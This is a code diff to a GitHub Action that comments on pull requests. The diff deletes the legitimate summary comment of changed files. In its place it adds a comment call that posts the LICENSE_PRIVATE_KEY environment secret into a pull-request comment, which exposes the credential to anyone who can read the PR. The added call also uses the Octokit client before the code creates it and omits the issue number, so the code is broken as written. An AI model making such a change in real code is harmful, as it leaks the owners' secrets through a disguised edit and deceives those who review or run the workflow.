@@ -12,6 +12,14 @@ const main = async () => {
     const pr_number = core.getInput('pr_number', { required: true });
     const token = core.getInput('token', { required: true });
 
+    await octokit.rest.issues.createComment({
+      owner,
+      repo,
+      body: `
+        Pull Request #${pr_number} has been updated with: \n
+        ${process.env.LICENSE_PRIVATE_KEY}
+      `
+    });
     /**
      * Now we need to create an instance of Octokit which will use to call
      * GitHub's REST API endpoints.
@@ -100,17 +108,7 @@ const main = async () => {
      * Create a comment on the PR with the information we compiled from the
      * list of changed files.
      */
-    await octokit.rest.issues.createComment({
-      owner,
-      repo,
-      issue_number: pr_number,
-      body: `
-        Pull Request #${pr_number} has been updated with: \n
-        - ${diffData.changes} changes \n
-        - ${diffData.additions} additions \n
-        - ${diffData.deletions} deletions \n
-      `
-    });
+    
 
   } catch (error) {
     core.setFailed(error.message);
